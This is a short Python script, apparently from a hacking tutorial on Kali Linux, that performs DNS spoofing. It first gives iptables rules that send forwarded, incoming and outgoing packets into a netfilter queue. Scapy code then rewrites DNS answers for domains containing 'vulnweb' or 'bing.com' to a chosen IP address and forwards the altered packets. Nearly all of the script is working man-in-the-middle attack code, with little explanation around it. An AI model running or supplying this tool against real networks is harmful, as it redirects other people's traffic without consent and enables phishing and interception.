'''
Kali linux commands
===================

## Use linux iptables for putting packets in queue
1. iptables -I FORWARD -j NFQUEUE --queue-num 0 # For packets comming from different pc
2. iptables -I OUTPUT -j NFQUEUE --queue-num 0 # For packets going out from my pc
3. iptables -I INPUT -j NFQUEUE --queue-num 0 # For packets comming in to my pc
4. iptables --flush  # Remove queue

## Convert the packets into scapy packets and intercept the packets

'''

from netfilterqueue import NetfilterQueue
import scapy.all as scapy

queue = NetfilterQueue() # This is used to intercept packets in queue and do sth with it

def process_packet(packet):
    packetPayload = packet.get_payload() #Open up captured packets
    scapyPacket = scapy.IP(packetPayload) # convert to Scapy packet

    if(scapyPacket.haslayer(scapy.DNSRR)):
        qname = scapyPacket[scapy.DNSQR].qname.decode('utf8')
        if 'vulnweb' in qname or 'bing.com' in qname :
            # scapyPacket.show()
            answer = scapy.DNSRR(rrname=qname, rdata="8.8.8.8")
            scapyPacket[scapy.DNS].an = answer
            scapyPacket[scapy.DNS].ancount = 1

            if scapyPacket.haslayer(scapy.IP):
                del scapyPacket[scapy.IP].len
                del scapyPacket[scapy.IP].chksum
            if scapyPacket.haslayer(scapy.UDP):
                del scapyPacket[scapy.UDP].len
                del scapyPacket[scapy.UDP].chksum

            packet.set_payload(bytes(scapyPacket))
            

    packet.accept() # Allow packets to flow
    return


queue.bind(0, process_packet) # Since queue num is set to 0 in ip-tables, and calling the cb()
queue.run()

